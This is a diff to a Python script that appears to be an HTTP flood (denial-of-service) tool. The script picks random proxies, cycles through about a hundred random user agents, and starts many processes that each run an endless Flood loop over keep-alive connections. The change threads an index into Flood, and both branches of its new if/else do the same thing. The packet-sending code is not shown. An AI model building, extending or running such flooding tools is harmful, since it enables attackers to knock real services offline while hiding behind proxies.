@@ -100,8 +100,11 @@ def checkProxies():
 
 time.sleep(1)
 
-def Flood():
-    proxy = rC(proxies).strip().split(":")
+def Flood(indexPicker):
+    if indexPicker < len(proxies):
+        proxy = rC(proxies).strip().split(":")
+    else:
+        proxy = rC(proxies).strip().split(":")
     Connection = "Connection: Keep-Alive\r\n"
     while True:
         try:
@@ -145,8 +148,8 @@ userAgentList = []
 for _ in range(100):
     userAgent = UserAgent().random
     userAgentList.append(userAgent)
-for _ in range(threadNumber):
-    thread = multiprocessing.Process(target=Flood)
+for indexPicker in range(threadNumber):
+    thread = multiprocessing.Process(target=Flood, args=(indexPicker, ))
     thread.setDaemon = False
     thread.start()
 
